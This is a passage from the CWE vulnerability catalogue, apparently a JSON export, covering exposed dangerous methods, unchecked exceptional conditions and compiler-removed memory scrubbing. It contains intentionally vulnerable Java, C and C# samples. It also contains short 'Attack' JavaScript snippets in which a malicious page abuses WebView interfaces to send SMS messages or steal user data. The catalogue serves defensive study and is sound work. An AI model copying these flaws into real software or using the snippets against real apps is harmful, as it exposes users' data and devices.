              "BodyText": "It is common practice to overwrite sensitive data manipulated in memory, such as passwords or cryptographic keys, in order to prevent attackers from learning system secrets. However, with the advent of optimizing compilers, programs do not always behave as their source code alone would suggest. In the example, the compiler interprets the call to memset() as dead code because the memory being written to is not subsequently used, despite the fact that there is clearly a security motivation for the operation to occur. The problem here is that many compilers, and in fact many programming languages, do not take this and other security concerns into consideration in their efforts to improve efficiency."
            },
            {
              "BodyText": "Attackers typically exploit this type of vulnerability by using a core dump or runtime mechanism to access the memory used by a particular application and recover the secret information. Once an attacker has access to the secret information, it is relatively straightforward to further exploit the system and possibly compromise other resources with which the application interacts."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-1685",
          "Description": "C compiler optimization, as allowed by specifications, removes code that is used to perform checks to detect integer overflows.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1685"
        },
        {
          "Reference": "CVE-2019-1010006",
          "Description": "Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-1010006"
        }
      ],
      "RelatedAttackPatterns": [
        "10",
        "24",
        "46",
        "8",
        "9"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 9, \"A Compiler Optimization Caveat\" Page 322",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "749",
      "Name": "Exposed Dangerous Method or Function",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product provides an Applications Programming Interface (API) or similar interface for interaction with external actors, but the interface includes a dangerous method or function that is not properly restricted.",
      "ExtendedDescription": "\n\nThis weakness can lead to a wide variety of resultant weaknesses, depending on the behavior of the exposed method. It can apply to any number of technologies and approaches, such as ActiveX controls, Java functions, IOCTLs, and so on.\n\n\nThe exposure can occur in a few different ways:\n\n\n  - The function/method was never intended to be exposed to outside actors.\n\n  - The function/method was only intended to be accessible to a limited set of actors, such as Internet-based access from a single web site.\n\n",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "284",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability",
            "Access Control",
            "Other"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity",
            "Read Application Data",
            "Modify Application Data",
            "Execute Unauthorized Code or Commands",
            "Other"
          ],
          "Note": "Exposing critical functionality essentially provides an attacker with the privilege level of the exposed functionality. This could result in the modification or exposure of sensitive data or possibly even execution of arbitrary code."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "If you must expose a method, make sure to perform input validation on all arguments, limit access to authorized parties, and protect against all possible vulnerabilities."
        },
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "\n\nIdentify all exposed functionality. Explicitly list all functionality that must be exposed to some user or set of users. Identify which functionality may be:\n\n\n  - accessible to all users\n\n  - restricted to a small set of privileged users\n\n  - prevented from being directly accessible at all\n\nEnsure that the implemented code follows these expectations. This includes setting the appropriate access modifiers where applicable (public, private, protected, etc.) or not marking ActiveX controls safe-for-scripting."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java example the method removeDatabase will delete the database with the name specified in the input parameter."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void removeDatabase(String databaseName) {\n\t\t\ttry {\n\t\t\t\t\tStatement stmt = conn.createStatement();\n\t\t\t\t\tstmt.execute(\"DROP DATABASE \" + databaseName);\n\t\t\t} catch (SQLException ex) {...}\n\t}\n```"
            },
            {
              "BodyText": "The method in this example is declared public and therefore is exposed to any class in the application. Deleting a database should be considered a critical operation within an application and access to this potentially dangerous method should be restricted. Within Java this can be accomplished simply by declaring the method private thereby exposing it only to the enclosing class as in the following example."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate void removeDatabase(String databaseName) {\n\t\t\ttry {\n\t\t\t\t\tStatement stmt = conn.createStatement();\n\t\t\t\t\tstmt.execute(\"DROP DATABASE \" + databaseName);\n\t\t\t} catch (SQLException ex) {...}\n\t\t\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-109",
          "Entries": [
            {
              "IntroText": "These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n```\n// Android* \n\t@Override\n\tpublic boolean shouldOverrideUrlLoading(WebView view, String url){\n\t```\n\t\t\tif (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){\n\t\t\t\tif(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){\n\t\t\t\t\twriteDataToView(view, UserData);\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Objective-C",
              "ExampleCode": "```\n```\n// iOS* \n\t-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType\n\t{\n\t```\n\t\t\tNSURL *URL = [exRequest URL];\n\t\t\tif ([[URL scheme] isEqualToString:@\"exampleScheme\"])\n\t\t\t{\n\t\t\t\t\tNSString *functionString = [URL resourceSpecifier];\n\t\t\t\t\tif ([functionString hasPrefix:@\"specialFunction\"])\n\t\t\t\t\t{\n```\n// Make data available back in webview.* \n\t\t\t\t\t\t\tUIWebView *webView = [self writeDataToView:[URL query]];}\n\t\t\t\t\treturn NO;}\n\t\t\treturn YES;}"
            },
            {
              "BodyText": "A call into native code can then be initiated by passing parameters within the URL:"
            },
            {
              "Nature": "Attack",
              "Language": "JavaScript",
              "ExampleCode": "```\n\twindow.location = examplescheme://method?parameter=value\n```"
            },
            {
              "BodyText": "Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This application uses a WebView to display websites, and creates a Javascript interface to a Java object to allow enhanced functionality on a trusted website:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class WebViewGUI extends Activity {\n\t\t\tWebView mainWebView;\n\t\t\tpublic void onCreate(Bundle savedInstanceState) {\n\t\t\t\tsuper.onCreate(savedInstanceState);\n\t\t\t\tmainWebView = new WebView(this);\n\t\t\t\tmainWebView.getSettings().setJavaScriptEnabled(true);\n\t\t\t\tmainWebView.addJavascriptInterface(new JavaScriptInterface(), \"userInfoObject\");\n\t\t\t\tmainWebView.loadUrl(\"file:///android_asset/www/index.html\");\n\t\t\t\tsetContentView(mainWebView);\n\t\t\t}\n\t\t\tfinal class JavaScriptInterface {\n\t\t\t\t\tJavaScriptInterface () {}\n\t\t\t\t\tpublic String getUserInfo() {\n\t\t\t\t\t\treturn currentUser.Info();\n\t\t\t\t\t}\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Before Android 4.2 all methods, including inherited ones, are exposed to Javascript when using addJavascriptInterface(). This means that a malicious website loaded within this WebView can use reflection to acquire a reference to arbitrary Java objects. This will allow the website code to perform any action the parent application is authorized to."
            },
            {
              "BodyText": "For example, if the application has permission to send text messages:"
            },
            {
              "Nature": "Attack",
              "Language": "JavaScript",
              "ExampleCode": "```\n\t<script>\n\t\tuserInfoObject.getClass().forName('android.telephony.SmsManager').getMethod('getDefault',null).sendTextMessage(attackNumber, null, attackMessage, null, null);\n\t</script>\n```"
            },
            {
              "BodyText": "This malicious script can use the userInfoObject object to load the SmsManager object and send arbitrary text messages to any recipient."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "After Android 4.2, only methods annotated with @JavascriptInterface are available in JavaScript, protecting usage of getClass() by default, as in this example:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tfinal class JavaScriptInterface {\n\t\t\tJavaScriptInterface () { }\n\t\t\t@JavascriptInterface\n\t\t\tpublic String getUserInfo() {\n\t\t\t\treturn currentUser.Info();\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "This code is not vulnerable to the above attack, but still may expose user info to malicious pages loaded in the WebView. Even malicious iframes loaded within a trusted page may access the exposed interface:"
            },
            {
              "Nature": "Attack",
              "Language": "JavaScript",
              "ExampleCode": "```\n\t<script>\n\t\tvar info = window.userInfoObject.getUserInfo();\n\t\tsendUserInfo(info);\n\t</script>\n```"
            },
            {
              "BodyText": "This malicious code within an iframe is able to access the interface object and steal the user's data."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-6382",
          "Description": "arbitrary Java code execution via exposed method",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6382"
        },
        {
          "Reference": "CVE-2007-1112",
          "Description": "security tool ActiveX control allows download or upload of files",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1112"
        }
      ],
      "RelatedAttackPatterns": [
        "500"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-503",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Developing Secure ActiveX Controls",
          "PublicationYear": "2005",
          "PublicationMonth": "04",
          "PublicationDay": "13",
          "URL": "https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-510",
          "Authors": [
            "Microsoft"
          ],
          "Title": "How to stop an ActiveX control from running in Internet Explorer",
          "URL": "https://support.microsoft.com/en-us/help/240797/how-to-stop-an-activex-control-from-running-in-internet-explorer",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "Under-reported and under-studied. This weakness could appear in any technology, language, or framework that allows the programmer to provide a functional interface to external parties, but it is not heavily reported. In 2007, CVE began showing a notable increase in reports of exposed method vulnerabilities in ActiveX applications, as well as IOCTL access to OS-level resources. These weaknesses have been documented for Java applications in various secure programming sources, but there are few reports in CVE, which suggests limited awareness in most parts of the vulnerability research community."
        }
      ]
    },
    {
      "ID": "754",
      "Name": "Improper Check for Unusual or Exceptional Conditions",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the product.",
      "ExtendedDescription": "\n\nThe programmer may assume that certain events or conditions will never occur or do not need to be worried about, such as low memory conditions, lack of access to resources due to restrictive permissions, or misbehaving clients or components. However, attackers may intentionally trigger these unusual conditions, thus violating the programmer's assumptions, possibly introducing instability, incorrect behavior, or a vulnerability.\n\n\nNote that this entry is not exclusively about the use of exceptions and exception handling, which are mechanisms for both checking and handling unusual or unexpected conditions.\n",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "703",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "416",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
        "Many functions will return some value about the success of their actions. This will alert the program whether or not to handle any errors caused by that function."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart",
            "Unexpected State"
          ],
          "Note": "The data which were produced as a result of a function call could be in a bad state upon return. If the return value is not checked, then this bad data may be used in operations, possibly leading to a crash or other unintended behaviors."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis may be useful for detecting unusual conditions involving system resources or common programming idioms, but not for violations of business rules.",
          "Effectiveness": "Moderate"
        },
        {
          "DetectionMethodID": "DM-12",
          "Method": "Manual Dynamic Analysis",
          "Description": "Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself."
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-3",
          "Phase": [
            "Requirements"
          ],
          "Strategy": "Language Selection",
          "Description": "\n\nUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nChoose languages with features such as exception handling that force the programmer to anticipate unusual conditions that may generate exceptions. Custom exceptions may need to be developed to handle unusual business-logic conditions. Be careful not to pass sensitive exceptions back to the user (CWE-209, CWE-248).\n"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Check the results of all functions that return a value and verify that the value is expected.",
          "Effectiveness": "High",
          "EffectivenessNotes": "Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If using exception handling, catch and throw specific exceptions instead of overly-general exceptions (CWE-396, CWE-397). Catch and handle exceptions as locally as possible so that exceptions do not propagate too far up the call stack (CWE-705). Avoid unchecked or uncaught exceptions where feasible (CWE-248).",
          "Effectiveness": "High",
          "EffectivenessNotes": "Using specific exceptions, and ensuring that exceptions are checked, helps programmers to anticipate and appropriately handle many unusual events that could occur."
        },
        {
          "MitigationID": "MIT-39",
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nEnsure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.\n\n\nIf errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.\n\n\nAvoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.\n\n\nExposing additional information to a potential attacker in the context of an exceptional condition can help the attacker determine what attack vectors are most likely to succeed beyond DoS.\n"
        },
        {
          "MitigationID": "MIT-5",
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n",
          "EffectivenessNotes": "Performing extensive input validation does not help with handling unusual conditions, but it will minimize their occurrences and will make it more difficult for attackers to trigger them."
        },
        {
          "MitigationID": "MIT-38",
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use system limits, which should help to prevent resource exhaustion. However, the product should still handle low resource conditions since they may still occur."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-7",
          "Entries": [
            {
              "IntroText": "Consider the following code segment:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar buf[10], cp_buf[10];\n\tfgets(buf, 10, stdin);\n\tstrcpy(cp_buf, buf);\n```"
            },
            {
              "BodyText": "The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy()."
            }
          ]
        },
        {
          "ID": "DX-8",
          "Entries": [
            {
              "IntroText": "The following code does not check to see if memory allocation succeeded before attempting to use the pointer returned by malloc()."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tbuf = (char*) malloc(req_size);\n\tstrncpy(buf, xfer, req_size);\n```"
            },
            {
              "BodyText": "The traditional defense of this coding error is: \"If my program runs out of memory, it will fail. It doesn't matter whether I handle the error or simply allow the program to die with a segmentation fault when it tries to dereference the null pointer.\" This argument ignores three important considerations:"
            },
            {
              "BodyText": "- Depending upon the type and size of the application, it may be possible to free memory that is being used elsewhere so that execution can continue.\n\n  - It is impossible for the program to perform a graceful exit if required. If the program is performing an atomic operation, it can leave the system in an inconsistent state.\n\n  - The programmer has lost the opportunity to record diagnostic information. Did the call to malloc() fail because req_size was too large or because there were too many requests being handled at the same time? Or was it caused by a memory leak that has built up over time? Without handling the error, there is no way to know."
            }
          ]
        },
        {
          "ID": "DX-9",
          "Entries": [
            {
              "IntroText": "The following examples read a file into a byte array."
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\tchar[] byteArray = new char[1024];\n\tfor (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) {\n\t\tString userName = (String) i.Current();\n\t\tString pFileName = PFILE_ROOT + \"/\" + userName;\n\t\tStreamReader sr = new StreamReader(pFileName);\n\t\tsr.Read(byteArray,0,1024);//the file is always 1k bytes\n\t\tsr.Close();\n\t\tprocessPFile(userName, byteArray);\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tFileInputStream fis;\n\tbyte[] byteArray = new byte[1024];\n\tfor (Iterator i=users.iterator(); i.hasNext();) {\n\t\t\tString userName = (String) i.next();\n\t\t\tString pFileName = PFILE_ROOT + \"/\" + userName;\n\t\t\tFileInputStream fis = new FileInputStream(pFileName);\n\t\t\tfis.read(byteArray); // the file is always 1k bytes\n\t\t\tfis.close();\n\t\t\tprocessPFile(userName, byteArray);\n```"
            },
            {
              "BodyText": "The code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always 1 kilobyte in size and therefore ignores the return value from Read(). If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and treat it as though it belongs to the attacker."
            }
          ]
        },
        {
          "ID": "DX-10",
          "Entries": [
            {
              "IntroText": "The following code does not check to see if the string returned by getParameter() is null before calling the member function compareTo(), potentially causing a NULL dereference."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString itemName = request.getParameter(ITEM_NAME);\n\tif (itemName.compareTo(IMPORTANT_ITEM) == 0) {\n\t\t...\n\t}\n\t...\n```"
            },
            {
              "BodyText": "The following code does not check to see if the string returned by the Item property is null before calling the member function Equals(), potentially causing a NULL dereference."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString itemName = request.Item(ITEM_NAME);\n\tif (itemName.Equals(IMPORTANT_ITEM)) {\n\t\t...\n\t}\n\t...\n```"
            },
            {
              "BodyText": "The traditional defense of this coding error is: \"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value.\" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved."
            }
          ]
        },
        {
          "ID": "DX-11",
          "Entries": [
            {
              "IntroText": "The following code shows a system property that is set to null and later dereferenced by a programmer who mistakenly assumes it will always be defined."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tSystem.clearProperty(\"os.name\");\n\t...\n\tString os = System.getProperty(\"os.name\");\n\tif (os.equalsIgnoreCase(\"Windows 95\")) System.out.println(\"Not supported\");\n```"
            },
            {
              "BodyText": "The traditional defense of this coding error is: \"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value.\" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved."
            }
          ]
        },
        {
          "ID": "DX-12",
          "Entries": [
            {
              "IntroText": "The following VB.NET code does not check to make sure that it has read 50 bytes from myfile.txt. This can cause DoDangerousOperation() to operate on an unexpected value."
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\tDim MyFile As New FileStream(\"myfile.txt\", FileMode.Open, FileAccess.Read, FileShare.Read)\n\tDim MyArray(50) As Byte\n\tMyFile.Read(MyArray, 0, 50)\n\tDoDangerousOperation(MyArray(20))\n```"
            },
            {
              "BodyText": "In .NET, it is not uncommon for programmers to misunderstand Read() and related methods that are part of many System.IO classes. The stream and reader classes do not consider it to be unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested."
            }
          ]
        },
        {
          "ID": "DX-1",
          "Entries": [
            {
              "IntroText": "This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid host_lookup(char *user_supplied_addr){\n\t\t\tstruct hostent *hp;\n\t\t\tin_addr_t *addr;\n\t\t\tchar hostname[64];\n\t\t\tin_addr_t inet_addr(const char *cp);\n```\n/*routine that ensures user_supplied_addr is in the right format for conversion */* \n\t\t\t\n\t\t\tvalidate_addr_form(user_supplied_addr);\n\t\t\taddr = inet_addr(user_supplied_addr);\n\t\t\thp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);\n\t\t\tstrcpy(hostname, hp->h_name);}"
            },
            {
              "BodyText": "If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy()."
            },
            {
              "BodyText": "Note that this code is also vulnerable to a buffer overflow (CWE-119)."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following C/C++ example the method outputStringToFile opens a file in the local filesystem and outputs a string to the file. The input parameters output and filename contain the string to output to the file and the name of the file respectively."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tint outputStringToFile(char *output, char *filename) {\n\t\t\topenFileToWrite(filename);\n\t\t\twriteToFile(output);\n\t\t\tcloseFile(filename);\n\t}\n```"
            },
            {
              "BodyText": "However, this code does not check the return values of the methods openFileToWrite, writeToFile, closeFile to verify that the file was properly opened and closed and that the string was successfully written to the file. The return values for these methods should be checked to determine if the method was successful and allow for detection of errors or unexpected conditions as in the following example."
            },
            {
              "Nature": "Good",
              "Language": "C++",
              "ExampleCode": "```\n\tint outputStringToFile(char *output, char *filename) {\n\t\t\tint isOutput = SUCCESS;\n\t\t\tint isOpen = openFileToWrite(filename);\n\t\t\tif (isOpen == FAIL) {\n\t\t\t\tprintf(\"Unable to open file %s\", filename);\n\t\t\t\tisOutput = FAIL;\n\t\t\t}\n\t\t\telse {\n\t\t\t\t\tint isWrite = writeToFile(output);\n\t\t\t\t\tif (isWrite == FAIL) {\n\t\t\t\t\t\tprintf(\"Unable to write to file %s\", filename);\n\t\t\t\t\t\tisOutput = FAIL;\n\t\t\t\t\t}\n\t\t\t\t\tint isClose = closeFile(filename);\n\t\t\t\t\tif (isClose == FAIL)\n\t\t\t\t\t\tisOutput = FAIL;\n\t\t\t}\n\t\t\treturn isOutput;\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following Java example the method readFromFile uses a FileReader object to read the contents of a file. The FileReader object is created using the File object readFile, the readFile object is initialized using the setInputFile method. The setInputFile method should be called before calling the readFromFile method."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate File readFile = null;\n\tpublic void setInputFile(String inputFile) {\n```\n// create readFile File object from string containing name of file* \n\t\t\t}\n\t\n\tpublic void readFromFile() {\n\t```\n\t\t\ttry {\n\t\t\t\t\treader = new FileReader(readFile);\n```\n// read input file* \n\t\t\t\t\t} catch (FileNotFoundException ex) {...}}"
            },
            {
              "BodyText": "However, the readFromFile method does not check to see if the readFile object is null, i.e. has not been initialized, before creating the FileReader object and reading from the input file. The readFromFile method should verify whether the readFile object is null and output an error message and raise an exception if the readFile object is null, as in the following code."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate File readFile = null;\n\tpublic void setInputFile(String inputFile) {\n```\n// create readFile File object from string containing name of file* \n\t\t\t}\n\t\n\tpublic void readFromFile() {\n\t```\n\t\t\ttry {\n\t\t\t\t\tif (readFile == null) {\n\t\t\t\t\t\tSystem.err.println(\"Input file has not been set, call setInputFile method before calling openInputFile\");\n\t\t\t\t\t\tthrow NullPointerException;\n\t\t\t\t\t}\n\t\t\t\t\treader = new FileReader(readFile);\n```\n// read input file* \n\t\t\t\t\t} catch (FileNotFoundException ex) {...}\n\t\t\tcatch (NullPointerException ex) {...}}"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2023-49286",
          "Description": "Chain: function in web caching proxy does not correctly check a return value (CWE-253) leading to a reachable assertion (CWE-617)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2023-49286"
        },
        {
          "Reference": "CVE-2007-3798",
          "Description": "Unchecked return value leads to resultant integer overflow and code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-3798"
        },
        {
          "Reference": "CVE-2006-4447",
          "Description": "Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4447"
        },
        {
          "Reference": "CVE-2006-2916",
          "Description": "Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2916"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "EXP31-PL",
          "EntryName": "Do not suppress or ignore exceptions",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 3.5"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 3.7"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Program Building Blocks\" Page 341",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 1, \"Exceptional Conditions,\" Page 22",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 11: Failure to Handle Errors Correctly.\" Page 183",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
